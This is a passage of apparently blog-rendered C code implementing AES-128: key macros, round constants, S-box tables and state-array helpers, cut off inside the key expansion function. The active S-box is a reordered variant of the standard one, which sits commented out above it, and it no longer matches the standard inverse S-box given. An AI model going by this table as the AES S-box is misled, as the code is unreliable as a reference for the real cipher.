class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="type">uint32_t</span> eK[<span class="number">44</span>], dK[<span class="number">44</span>];    <span class="comment">// encKey, decKey</span></span><br><span class="line">    <span class="type">int</span> Nr; <span class="comment">// 10 rounds</span></span><br><span class="line">&#125;AesKey;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BLOCKSIZE 16  <span class="comment">//AES-128分组长度为16字节</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// uint8_t y[4] -&gt; uint32_t x</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LOAD32H(x, y) \</span></span><br><span class="line"><span class="meta">  do &#123; (x) = ((uint32_t)((y)[0] &amp; 0xff)&lt;&lt;24) | ((uint32_t)((y)[1] &amp; 0xff)&lt;&lt;16) | \</span></span><br><span class="line"><span class="meta">             ((uint32_t)((y)[2] &amp; 0xff)&lt;&lt;8)  | ((uint32_t)((y)[3] &amp; 0xff));&#125; while(0)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// uint32_t x -&gt; uint8_t y[4]</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STORE32H(x, y) \</span></span><br><span class="line"><span class="meta">  do &#123; (y)[0] = (uint8_t)(((x)&gt;&gt;24) &amp; 0xff); (y)[1] = (uint8_t)(((x)&gt;&gt;16) &amp; 0xff);   \</span></span><br><span class="line"><span class="meta">       (y)[2] = (uint8_t)(((x)&gt;&gt;8) &amp; 0xff); (y)[3] = (uint8_t)((x) &amp; 0xff); &#125; while(0)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 从uint32_t x中提取从低位开始的第n个字节</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BYTE(x, n) (((x) &gt;&gt; (8 * (n))) &amp; 0xff)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* used for keyExpansion */</span></span><br><span class="line"><span class="comment">// 字节替换然后循环左移1位</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MIX(x) (((S[BYTE(x, 2)] &lt;&lt; 24) &amp; 0xff000000) ^ ((S[BYTE(x, 1)] &lt;&lt; 16) &amp; 0xff0000) ^ \</span></span><br><span class="line"><span class="meta">                ((S[BYTE(x, 0)] &lt;&lt; 8) &amp; 0xff00) ^ (S[BYTE(x, 3)] &amp; 0xff))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// uint32_t x循环左移n位</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ROF32(x, n)  (((x) <span class="string">&lt;&lt; (n)) | ((x) &gt;</span>&gt; (32-(n))))</span></span><br><span class="line"><span class="comment">// uint32_t x循环右移n位</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ROR32(x, n)  (((x) &gt;&gt; (n)) | ((x) &lt;&lt; (32-(n))))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* for 128-bit blocks, Rijndael never uses more than 10 rcon values */</span></span><br><span class="line"><span class="comment">// AES-128轮常量</span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">uint32_t</span> rcon[<span class="number">10</span>] = &#123;</span><br><span class="line">        <span class="number">0x01000000</span>UL, <span class="number">0x02000000</span>UL, <span class="number">0x04000000</span>UL, <span class="number">0x08000000</span>UL, <span class="number">0x10000000</span>UL,</span><br><span class="line">        <span class="number">0x20000000</span>UL, <span class="number">0x40000000</span>UL, <span class="number">0x80000000</span>UL, <span class="number">0x1B000000</span>UL, <span class="number">0x36000000</span>UL</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// S盒</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">unsigned char S[256] = &#123;</span></span><br><span class="line"><span class="comment">        0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76,</span></span><br><span class="line"><span class="comment">        0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0,</span></span><br><span class="line"><span class="comment">        0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15,</span></span><br><span class="line"><span class="comment">        0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75,</span></span><br><span class="line"><span class="comment">        0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84,</span></span><br><span class="line"><span class="comment">        0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF,</span></span><br><span class="line"><span class="comment">        0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8,</span></span><br><span class="line"><span class="comment">        0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2,</span></span><br><span class="line"><span class="comment">        0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73,</span></span><br><span class="line"><span class="comment">        0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB,</span></span><br><span class="line"><span class="comment">        0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79,</span></span><br><span class="line"><span class="comment">        0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08,</span></span><br><span class="line"><span class="comment">        0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A,</span></span><br><span class="line"><span class="comment">        0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E,</span></span><br><span class="line"><span class="comment">        0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF,</span></span><br><span class="line"><span class="comment">        0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16</span></span><br><span class="line"><span class="comment">&#125;;*/</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> S[<span class="number">256</span>] = &#123;<span class="number">0x7C</span>, <span class="number">0xCA</span>, <span class="number">0x7B</span>, <span class="number">0x77</span>, <span class="number">0xF2</span>, <span class="number">0x6B</span>, <span class="number">0x6F</span>, <span class="number">0xC5</span>, <span class="number">0x30</span>, <span class="number">0x01</span>,</span><br><span class="line">  <span class="number">0x67</span>, <span class="number">0x2B</span>, <span class="number">0xFE</span>, <span class="number">0xD7</span>, <span class="number">0x47</span>, <span class="number">0xAB</span>, <span class="number">0x76</span>, <span class="number">0x63</span>, <span class="number">0x82</span>, <span class="number">0xC9</span>,</span><br><span class="line">  <span class="number">0x7D</span>, <span class="number">0xFA</span>, <span class="number">0x59</span>, <span class="number">0xF0</span>, <span class="number">0xAD</span>, <span class="number">0xD4</span>, <span class="number">0xA2</span>, <span class="number">0xAF</span>, <span class="number">0x9C</span>, <span class="number">0xA4</span>,</span><br><span class="line">  <span class="number">0x72</span>, <span class="number">0xC0</span>, <span class="number">0xB7</span>, <span class="number">0xFD</span>, <span class="number">0x93</span>, <span class="number">0x26</span>, <span class="number">0x36</span>, <span class="number">0x3F</span>, <span class="number">0xF7</span>, <span class="number">0xCC</span>,</span><br><span class="line">  <span class="number">0x34</span>, <span class="number">0xA5</span>, <span class="number">0xE5</span>, <span class="number">0xF1</span>, <span class="number">0x71</span>, <span class="number">0xD8</span>, <span class="number">0x31</span>, <span class="number">0x15</span>, <span class="number">0x04</span>, <span class="number">0xC7</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0xC3</span>, <span class="number">0x18</span>, <span class="number">0x96</span>, <span class="number">0x05</span>, <span class="number">0x9A</span>, <span class="number">0x07</span>, <span class="number">0x12</span>, <span class="number">0x80</span>, <span class="number">0xE2</span>,</span><br><span class="line">  <span class="number">0xEB</span>, <span class="number">0x27</span>, <span class="number">0xB2</span>, <span class="number">0x75</span>, <span class="number">0x09</span>, <span class="number">0x83</span>, <span class="number">0x2C</span>, <span class="number">0x1A</span>, <span class="number">0x1B</span>, <span class="number">0x6E</span>,</span><br><span class="line">  <span class="number">0x5A</span>, <span class="number">0xA0</span>, <span class="number">0x52</span>, <span class="number">0x3B</span>, <span class="number">0xD6</span>, <span class="number">0xB3</span>, <span class="number">0x29</span>, <span class="number">0xE3</span>, <span class="number">0x2F</span>, <span class="number">0x84</span>,</span><br><span class="line">  <span class="number">0x53</span>, <span class="number">0xD1</span>, <span class="number">0x00</span>, <span class="number">0xED</span>, <span class="number">0x20</span>, <span class="number">0xFC</span>, <span class="number">0xB1</span>, <span class="number">0x5B</span>, <span class="number">0x6A</span>, <span class="number">0xCB</span>,</span><br><span class="line">  <span class="number">0xBE</span>, <span class="number">0x39</span>, <span class="number">0x4A</span>, <span class="number">0x4C</span>, <span class="number">0x58</span>, <span class="number">0xCF</span>, <span class="number">0xD0</span>, <span class="number">0xEF</span>, <span class="number">0xAA</span>, <span class="number">0xFB</span>,</span><br><span class="line">  <span class="number">0x43</span>, <span class="number">0x4D</span>, <span class="number">0x33</span>, <span class="number">0x85</span>, <span class="number">0x45</span>, <span class="number">0xF9</span>, <span class="number">0x02</span>, <span class="number">0x7F</span>, <span class="number">0x50</span>, <span class="number">0x3C</span>,</span><br><span class="line">  <span class="number">0x9F</span>, <span class="number">0xA8</span>, <span class="number">0x51</span>, <span class="number">0xA3</span>, <span class="number">0x40</span>, <span class="number">0x8F</span>, <span class="number">0x92</span>, <span class="number">0x9D</span>, <span class="number">0x38</span>, <span class="number">0xF5</span>,</span><br><span class="line">  <span class="number">0xBC</span>, <span class="number">0xB6</span>, <span class="number">0xDA</span>, <span class="number">0x21</span>, <span class="number">0x10</span>, <span class="number">0xFF</span>, <span class="number">0xF3</span>, <span class="number">0xD2</span>, <span class="number">0x97</span>, <span class="number">0xCD</span>,</span><br><span class="line">  <span class="number">0x0C</span>, <span class="number">0x13</span>, <span class="number">0xEC</span>, <span class="number">0x5F</span>, <span class="number">0x44</span>, <span class="number">0x17</span>, <span class="number">0xC4</span>, <span class="number">0xA7</span>, <span class="number">0x7E</span>, <span class="number">0x3D</span>,</span><br><span class="line">  <span class="number">0x64</span>, <span class="number">0x5D</span>, <span class="number">0x19</span>, <span class="number">0x73</span>, <span class="number">0x60</span>, <span class="number">0x81</span>, <span class="number">0x4F</span>, <span class="number">0xDC</span>, <span class="number">0x22</span>, <span class="number">0x2A</span>,</span><br><span class="line">  <span class="number">0x90</span>, <span class="number">0x88</span>, <span class="number">0x46</span>, <span class="number">0xEE</span>, <span class="number">0xB8</span>, <span class="number">0x14</span>, <span class="number">0xDE</span>, <span class="number">0x5E</span>, <span class="number">0x0B</span>, <span class="number">0xDB</span>,</span><br><span class="line">  <span class="number">0xE0</span>, <span class="number">0x32</span>, <span class="number">0x3A</span>, <span class="number">0x0A</span>, <span class="number">0x49</span>, <span class="number">0x06</span>, <span class="number">0x24</span>, <span class="number">0x5C</span>, <span class="number">0xC2</span>, <span class="number">0xD3</span>,</span><br><span class="line">  <span class="number">0xAC</span>, <span class="number">0x62</span>, <span class="number">0x91</span>, <span class="number">0x95</span>, <span class="number">0xE4</span>, <span class="number">0x79</span>, <span class="number">0xE7</span>, <span class="number">0xC8</span>, <span class="number">0x37</span>, <span class="number">0x6D</span>,</span><br><span class="line">  <span class="number">0x8D</span>, <span class="number">0xD5</span>, <span class="number">0x4E</span>, <span class="number">0xA9</span>, <span class="number">0x6C</span>, <span class="number">0x56</span>, <span class="number">0xF4</span>, <span class="number">0xEA</span>, <span class="number">0x65</span>, <span class="number">0x7A</span>,</span><br><span class="line">  <span class="number">0xAE</span>, <span class="number">0x08</span>, <span class="number">0xBA</span>, <span class="number">0x78</span>, <span class="number">0x25</span>, <span class="number">0x2E</span>, <span class="number">0x1C</span>, <span class="number">0xA6</span>, <span class="number">0xB4</span>, <span class="number">0xC6</span>,</span><br><span class="line">  <span class="number">0xE8</span>, <span class="number">0xDD</span>, <span class="number">0x74</span>, <span class="number">0x1F</span>, <span class="number">0x4B</span>, <span class="number">0xBD</span>, <span class="number">0x8B</span>, <span class="number">0x8A</span>, <span class="number">0x70</span>, <span class="number">0x3E</span>,</span><br><span class="line">  <span class="number">0xB5</span>, <span class="number">0x66</span>, <span class="number">0x48</span>, <span class="number">0x03</span>, <span class="number">0xF6</span>, <span class="number">0x0E</span>, <span class="number">0x61</span>, <span class="number">0x35</span>, <span class="number">0x57</span>, <span class="number">0xB9</span>,</span><br><span class="line">  <span class="number">0x86</span>, <span class="number">0xC1</span>, <span class="number">0x1D</span>, <span class="number">0x9E</span>, <span class="number">0xE1</span>, <span class="number">0xF8</span>, <span class="number">0x98</span>, <span class="number">0x11</span>, <span class="number">0x69</span>, <span class="number">0xD9</span>,</span><br><span class="line">  <span class="number">0x8E</span>, <span class="number">0x94</span>, <span class="number">0x9B</span>, <span class="number">0x1E</span>, <span class="number">0xE9</span>, <span class="number">0xCE</span>, <span class="number">0x55</span>, <span class="number">0x28</span>, <span class="number">0xDF</span>, <span class="number">0x8C</span>,</span><br><span class="line">  <span class="number">0xA1</span>, <span class="number">0x89</span>, <span class="number">0x0D</span>, <span class="number">0xBF</span>, <span class="number">0xE6</span>, <span class="number">0x42</span>, <span class="number">0x68</span>, <span class="number">0x41</span>, <span class="number">0x99</span>, <span class="number">0x2D</span>,</span><br><span class="line">  <span class="number">0x0F</span>, <span class="number">0xB0</span>, <span class="number">0x54</span>, <span class="number">0xBB</span>, <span class="number">0x16</span>, <span class="number">0x87</span>&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//逆S盒</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> inv_S[<span class="number">256</span>] = &#123;</span><br><span class="line">        <span class="number">0x52</span>, <span class="number">0x09</span>, <span class="number">0x6A</span>, <span class="number">0xD5</span>, <span class="number">0x30</span>, <span class="number">0x36</span>, <span class="number">0xA5</span>, <span class="number">0x38</span>, <span class="number">0xBF</span>, <span class="number">0x40</span>, <span class="number">0xA3</span>, <span class="number">0x9E</span>, <span class="number">0x81</span>, <span class="number">0xF3</span>, <span class="number">0xD7</span>, <span class="number">0xFB</span>,</span><br><span class="line">        <span class="number">0x7C</span>, <span class="number">0xE3</span>, <span class="number">0x39</span>, <span class="number">0x82</span>, <span class="number">0x9B</span>, <span class="number">0x2F</span>, <span class="number">0xFF</span>, <span class="number">0x87</span>, <span class="number">0x34</span>, <span class="number">0x8E</span>, <span class="number">0x43</span>, <span class="number">0x44</span>, <span class="number">0xC4</span>, <span class="number">0xDE</span>, <span class="number">0xE9</span>, <span class="number">0xCB</span>,</span><br><span class="line">        <span class="number">0x54</span>, <span class="number">0x7B</span>, <span class="number">0x94</span>, <span class="number">0x32</span>, <span class="number">0xA6</span>, <span class="number">0xC2</span>, <span class="number">0x23</span>, <span class="number">0x3D</span>, <span class="number">0xEE</span>, <span class="number">0x4C</span>, <span class="number">0x95</span>, <span class="number">0x0B</span>, <span class="number">0x42</span>, <span class="number">0xFA</span>, <span class="number">0xC3</span>, <span class="number">0x4E</span>,</span><br><span class="line">        <span class="number">0x08</span>, <span class="number">0x2E</span>, <span class="number">0xA1</span>, <span class="number">0x66</span>, <span class="number">0x28</span>, <span class="number">0xD9</span>, <span class="number">0x24</span>, <span class="number">0xB2</span>, <span class="number">0x76</span>, <span class="number">0x5B</span>, <span class="number">0xA2</span>, <span class="number">0x49</span>, <span class="number">0x6D</span>, <span class="number">0x8B</span>, <span class="number">0xD1</span>, <span class="number">0x25</span>,</span><br><span class="line">        <span class="number">0x72</span>, <span class="number">0xF8</span>, <span class="number">0xF6</span>, <span class="number">0x64</span>, <span class="number">0x86</span>, <span class="number">0x68</span>, <span class="number">0x98</span>, <span class="number">0x16</span>, <span class="number">0xD4</span>, <span class="number">0xA4</span>, <span class="number">0x5C</span>, <span class="number">0xCC</span>, <span class="number">0x5D</span>, <span class="number">0x65</span>, <span class="number">0xB6</span>, <span class="number">0x92</span>,</span><br><span class="line">        <span class="number">0x6C</span>, <span class="number">0x70</span>, <span class="number">0x48</span>, <span class="number">0x50</span>, <span class="number">0xFD</span>, <span class="number">0xED</span>, <span class="number">0xB9</span>, <span class="number">0xDA</span>, <span class="number">0x5E</span>, <span class="number">0x15</span>, <span class="number">0x46</span>, <span class="number">0x57</span>, <span class="number">0xA7</span>, <span class="number">0x8D</span>, <span class="number">0x9D</span>, <span class="number">0x84</span>,</span><br><span class="line">        <span class="number">0x90</span>, <span class="number">0xD8</span>, <span class="number">0xAB</span>, <span class="number">0x00</span>, <span class="number">0x8C</span>, <span class="number">0xBC</span>, <span class="number">0xD3</span>, <span class="number">0x0A</span>, <span class="number">0xF7</span>, <span class="number">0xE4</span>, <span class="number">0x58</span>, <span class="number">0x05</span>, <span class="number">0xB8</span>, <span class="number">0xB3</span>, <span class="number">0x45</span>, <span class="number">0x06</span>,</span><br><span class="line">        <span class="number">0xD0</span>, <span class="number">0x2C</span>, <span class="number">0x1E</span>, <span class="number">0x8F</span>, <span class="number">0xCA</span>, <span class="number">0x3F</span>, <span class="number">0x0F</span>, <span class="number">0x02</span>, <span class="number">0xC1</span>, <span class="number">0xAF</span>, <span class="number">0xBD</span>, <span class="number">0x03</span>, <span class="number">0x01</span>, <span class="number">0x13</span>, <span class="number">0x8A</span>, <span class="number">0x6B</span>,</span><br><span class="line">        <span class="number">0x3A</span>, <span class="number">0x91</span>, <span class="number">0x11</span>, <span class="number">0x41</span>, <span class="number">0x4F</span>, <span class="number">0x67</span>, <span class="number">0xDC</span>, <span class="number">0xEA</span>, <span class="number">0x97</span>, <span class="number">0xF2</span>, <span class="number">0xCF</span>, <span class="number">0xCE</span>, <span class="number">0xF0</span>, <span class="number">0xB4</span>, <span class="number">0xE6</span>, <span class="number">0x73</span>,</span><br><span class="line">        <span class="number">0x96</span>, <span class="number">0xAC</span>, <span class="number">0x74</span>, <span class="number">0x22</span>, <span class="number">0xE7</span>, <span class="number">0xAD</span>, <span class="number">0x35</span>, <span class="number">0x85</span>, <span class="number">0xE2</span>, <span class="number">0xF9</span>, <span class="number">0x37</span>, <span class="number">0xE8</span>, <span class="number">0x1C</span>, <span class="number">0x75</span>, <span class="number">0xDF</span>, <span class="number">0x6E</span>,</span><br><span class="line">        <span class="number">0x47</span>, <span class="number">0xF1</span>, <span class="number">0x1A</span>, <span class="number">0x71</span>, <span class="number">0x1D</span>, <span class="number">0x29</span>, <span class="number">0xC5</span>, <span class="number">0x89</span>, <span class="number">0x6F</span>, <span class="number">0xB7</span>, <span class="number">0x62</span>, <span class="number">0x0E</span>, <span class="number">0xAA</span>, <span class="number">0x18</span>, <span class="number">0xBE</span>, <span class="number">0x1B</span>,</span><br><span class="line">        <span class="number">0xFC</span>, <span class="number">0x56</span>, <span class="number">0x3E</span>, <span class="number">0x4B</span>, <span class="number">0xC6</span>, <span class="number">0xD2</span>, <span class="number">0x79</span>, <span class="number">0x20</span>, <span class="number">0x9A</span>, <span class="number">0xDB</span>, <span class="number">0xC0</span>, <span class="number">0xFE</span>, <span class="number">0x78</span>, <span class="number">0xCD</span>, <span class="number">0x5A</span>, <span class="number">0xF4</span>,</span><br><span class="line">        <span class="number">0x1F</span>, <span class="number">0xDD</span>, <span class="number">0xA8</span>, <span class="number">0x33</span>, <span class="number">0x88</span>, <span class="number">0x07</span>, <span class="number">0xC7</span>, <span class="number">0x31</span>, <span class="number">0xB1</span>, <span class="number">0x12</span>, <span class="number">0x10</span>, <span class="number">0x59</span>, <span class="number">0x27</span>, <span class="number">0x80</span>, <span class="number">0xEC</span>, <span class="number">0x5F</span>,</span><br><span class="line">        <span class="number">0x60</span>, <span class="number">0x51</span>, <span class="number">0x7F</span>, <span class="number">0xA9</span>, <span class="number">0x19</span>, <span class="number">0xB5</span>, <span class="number">0x4A</span>, <span class="number">0x0D</span>, <span class="number">0x2D</span>, <span class="number">0xE5</span>, <span class="number">0x7A</span>, <span class="number">0x9F</span>, <span class="number">0x93</span>, <span class="number">0xC9</span>, <span class="number">0x9C</span>, <span class="number">0xEF</span>,</span><br><span class="line">        <span class="number">0xA0</span>, <span class="number">0xE0</span>, <span class="number">0x3B</span>, <span class="number">0x4D</span>, <span class="number">0xAE</span>, <span class="number">0x2A</span>, <span class="number">0xF5</span>, <span class="number">0xB0</span>, <span class="number">0xC8</span>, <span class="number">0xEB</span>, <span class="number">0xBB</span>, <span class="number">0x3C</span>, <span class="number">0x83</span>, <span class="number">0x53</span>, <span class="number">0x99</span>, <span class="number">0x61</span>,</span><br><span class="line">        <span class="number">0x17</span>, <span class="number">0x2B</span>, <span class="number">0x04</span>, <span class="number">0x7E</span>, <span class="number">0xBA</span>, <span class="number">0x77</span>, <span class="number">0xD6</span>, <span class="number">0x26</span>, <span class="number">0xE1</span>, <span class="number">0x69</span>, <span class="number">0x14</span>, <span class="number">0x63</span>, <span class="number">0x55</span>, <span class="number">0x21</span>, <span class="number">0x0C</span>, <span class="number">0x7D</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* copy in[16] to state[4][4] */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">loadStateArray</span><span class="params">(<span class="type">uint8_t</span> (*state)[<span class="number">4</span>], <span class="type">const</span> <span class="type">uint8_t</span> *in)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j) &#123;</span><br><span class="line">            state[j][i] = *in++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* copy state[4][4] to out[16] */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">storeStateArray</span><span class="params">(<span class="type">uint8_t</span> (*state)[<span class="number">4</span>], <span class="type">uint8_t</span> *out)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j) &#123;</span><br><span class="line">            *out++ = state[j][i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//秘钥扩展</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">keyExpansion</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span> *key, <span class="type">uint32_t</span> keyLen, AesKey *aesKey)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == key || <span class="literal">NULL</span> == aesKey)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;keyExpansion param is NULL\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (keyLen != <span class="number">16</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;keyExpansion keyLen = %d, Not support.\n&quot;</span>, keyLen);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> *w = 